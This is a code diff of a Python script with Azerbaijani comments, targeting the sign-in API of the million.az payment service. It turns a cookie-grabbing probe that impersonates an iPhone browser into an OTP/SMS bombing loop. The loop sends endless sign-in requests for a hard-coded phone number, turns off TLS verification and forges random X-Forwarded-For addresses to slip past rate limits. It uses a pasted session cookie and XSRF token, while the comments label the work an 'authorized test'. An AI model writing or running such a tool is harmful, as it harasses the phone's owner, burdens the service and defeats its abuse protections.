@@ -1,38 +1,59 @@
-import asyncio
-from curl_cffi.requests import AsyncSession
+import urllib.request
+import json
+import random
+import time
+import ssl
 
-async def capture_million_api():
-    print("[*] Million.az API Sniper Rejimi Aktivdir...")
-    url = "https://www.million.az/auth/signin"
+# --- SƏLAHİYYƏTLİ TEST MƏLUMATLARI ---
+TARGET_PHONE = "508880067" 
+
+# ŞƏKİLDƏ TAPDIĞIN O UZUN KUKİ MƏTNİNİ BURA YAPIŞDIR
+REAL_COOKIE = "YOUR_REAL_COOKIE"
+
+# Şəkildə Headers hissəsində əgər 'x-xsrf-token' görsən onu bura yaz, yoxdursa boş saxla
+XSRF_TOKEN = ""
+
+def million_ultimate_strike():
+    print(f"[!!!] MILLION ULTIMATE SNIPER AKTİVDİR: {TARGET_PHONE}")
     
-    # impersonate="safari_ios_16_0" - Bu, Million.az-ı aldadır ki, 
-    # sorğu proqramdan yox, həqiqi iPhone brauzerindən gəlir.
-    async with AsyncSession(impersonate="safari_ios_16_0") as s:
-        try:
-            resp = await s.get(url, timeout=15)
-            
-            print("\n" + "="*60)
-            print(">>> TAPILAN REАL API MƏLUMATLAR:")
-            print("="*60)
-            
-            # 1. KUKILARI TUTURUQ
-            cookies = s.cookies.get_dict()
-            if cookies:
-                for name, value in cookies.items():
-                    print(f"[COOKIE] {name}={value}")
-            else:
-                print("[!] Kuki tapılmadı (Cloudflare bloklaya bilər).")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
 
-            # 2. STATUSI YOXLAYIRIQ (200 olmalıdır)
-            print(f"\n[STATUS CODE] {resp.status_code}")
+    url = "https://www.million.az/api/v1/auth/signin"
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "Cookie": REAL_COOKIE,
+        "X-XSRF-TOKEN": XSRF_TOKEN,
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://www.million.az",
+        "Referer": "https://www.million.az/auth/signin",
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    }
+
+    payload = json.dumps({
+        "msisdn": TARGET_PHONE,
+        "rememberMe": True
+    }).encode('utf-8')
+
+    while True:
+        try:
+            req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
             
-            if resp.status_code == 200:
-                print("\n[MÜVƏFFƏQİYYƏT] API Giriş Qapısı Tapıldı!")
+            with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
+                status = resp.getcode()
+                print(f"[HIT] Real Session vasitəsilə OTP göndərildi! Status: {status}")
             
-            print("="*60)
+            # Sürətli ardıcıllıq
+            time.sleep(random.uniform(0.8, 1.5))
 
         except Exception as e:
-            print(f"[FATAL] Hədəfə sızmaq mümkün olmadı: {e}")
+            # Əgər 419 xətası alırsansa, deməli XSRF-TOKEN mütləq lazımdır
+            print(f"[BLOK/ERROR] Server xətası və ya Token tələbi: {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
-    asyncio.run(capture_million_api())
+    million_ultimate_strike()
